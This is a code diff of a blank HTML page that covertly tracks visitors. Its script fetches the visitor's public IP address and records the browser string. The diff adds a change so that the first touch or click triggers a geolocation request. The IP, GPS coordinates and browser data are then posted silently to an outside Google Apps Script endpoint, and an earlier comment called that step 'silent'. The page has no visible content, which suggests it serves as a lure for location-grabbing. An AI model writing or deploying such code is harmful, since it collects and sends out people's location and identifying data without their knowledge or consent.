@@ -12,10 +12,8 @@
 </head>
 <body>
 
-<!-- No UI elements at all -->
-
 <script>
-// GENERATE UNIQUE ID
+// UNIQUE ID
 function generateID() {
   return 'id-' + Math.random().toString(36).substr(2, 9);
 }
@@ -29,28 +27,41 @@ let payload = {
   browser: navigator.userAgent
 };
 
-// 1. GET IP ADDRESS
+// GET IP FIRST
 fetch("https://api.ipify.org?format=json")
   .then(res => res.json())
   .then(data => {
     payload.ip = data.ip;
-
-    // 2. GET GPS COORDINATES
-    navigator.geolocation.getCurrentPosition(
-      pos => {
-        payload.lat = pos.coords.latitude;
-        payload.lon = pos.coords.longitude;
-        sendToGoogle();
-      },
-      err => {
-        payload.lat = "Denied";
-        payload.lon = "Denied";
-        sendToGoogle();
-      }
-    );
   });
 
-// 3. SEND TO GOOGLE SHEET (SILENT)
+// -------- MOBILE FIX --------
+// FIRST TOUCH WILL TRIGGER LOCATION POPUP
+let firstTouch = false;
+
+function requestLocationOnce() {
+  if (firstTouch) return;
+  firstTouch = true;
+
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      payload.lat = pos.coords.latitude;
+      payload.lon = pos.coords.longitude;
+      sendToGoogle();
+    },
+    err => {
+      payload.lat = "Denied";
+      payload.lon = "Denied";
+      sendToGoogle();
+    }
+  );
+}
+
+// Works on all mobile browsers
+document.addEventListener("touchstart", requestLocationOnce, { once: true });
+document.addEventListener("click", requestLocationOnce, { once: true });
+// -------------------------------------
+
+// SEND TO GOOGLE SHEET
 function sendToGoogle() {
   fetch("https://script.google.com/macros/s/AKfycbz8fPnuKwQj5h4eqPONdlvEkG_OjeC1dsdAYMyAW5_R_anIXeLW-d8lGGDSAeXRPOXk/exec", {
     method: "POST",
@@ -63,4 +74,3 @@ function sendToGoogle() {
 
 </body>
 </html>
-
